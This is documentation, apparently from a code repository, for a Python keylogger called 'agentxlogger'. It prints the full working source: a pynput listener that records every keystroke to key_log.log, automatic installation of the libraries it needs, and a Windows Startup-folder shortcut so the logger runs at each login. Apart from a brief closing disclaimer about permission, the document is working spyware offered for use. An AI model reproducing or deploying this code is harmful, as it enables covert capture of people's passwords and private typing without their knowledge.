

Python agentxlogger Documentation
Overview
This Python keylogger captures keystrokes and logs them into a file. It is designed to run in the background and can automatically start with the operating system. The captured keystrokes are saved in a file named key_log.log.

Prerequisites
Before running the keylogger, ensure you have the following libraries installed:

pynput: For capturing keyboard events.
plyer: For displaying notifications (if desired).
pywin32: For creating Windows shortcuts.
If these libraries are not installed, the keylogger will attempt to install them automatically.

Installation
Ensure Python is installed on your system.
Download the script and save it as keylogger.py.
Run the script using Python:
bash
Copy code
python keylogger.py
The script will check for required packages and install any that are missing.

Usage
Once the script is running, it will capture all keyboard inputs until the "Escape" key is pressed. The logged keystrokes will be saved in key_log.log in the same directory as the script.

Automatic Startup
The keylogger creates a shortcut in the Windows Startup folder, ensuring it runs automatically whenever the user logs into Windows.

Code Explanation
Imports and Package Installation
python
Copy code
import subprocess
import sys
import os
import win32com.client  

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
subprocess: Used for executing system commands.
sys: Provides access to system-specific parameters and functions.
os: Used for interacting with the operating system.
win32com.client: Used for creating Windows shortcuts.
Library Import and Installation
python
Copy code
try:
    from pynput.keyboard import Key, Listener
    from plyer import notification
except ImportError:
    list1 = ['tkinter', 'pynput', 'plyer', 'pywin32']
    for i in list1:
        install(i)
This section attempts to import necessary libraries. If any library is missing, it installs them.

Logging Mechanism
python
Copy code
log_file = "key_log.log"
log_content = ""

def on_press(key):
    global log_content
    try:
        if key.char: 
            log_content += key.char  
    except AttributeError:
        if key == Key.backspace:
            log_content = log_content[:-1] 
        else:
            log_content += f" {key} "

    with open(log_file, "w") as f: 
        f.write(log_content)
log_file: Specifies the name of the log file.
log_content: A string that holds the recorded keystrokes.
on_press: A callback function triggered when a key is pressed. It appends the pressed key to log_content and writes it to log_file.
Key Release Handling
python
Copy code
def on_release(key):
    if key == Key.esc:
        return False
on_release: A callback function triggered when a key is released. If the "Escape" key is pressed, it stops the listener.
Creating a Startup Shortcut
python
Copy code
def create_startup_shortcut():
    keylogger_path = os.path.join(os.path.dirname(sys.executable), "dist", "keylogger.exe")

    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(os.path.join(startup_folder, "Keylogger.lnk"))
    shortcut.TargetPath = keylogger_path
    shortcut.WorkingDirectory = os.path.dirname(keylogger_path)
    shortcut.save()

create_startup_shortcut()
create_startup_shortcut: Creates a Windows shortcut to ensure the keylogger runs at startup.
Main Listener
python
Copy code
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
Listener: A context manager that listens for keyboard events. It calls on_press and on_release as keys are pressed and released, respectively.
Important Notes
Ensure that you have permission to run a keylogger on the system.
Misuse of this software can lead to legal consequences. Use it responsibly and ethically.

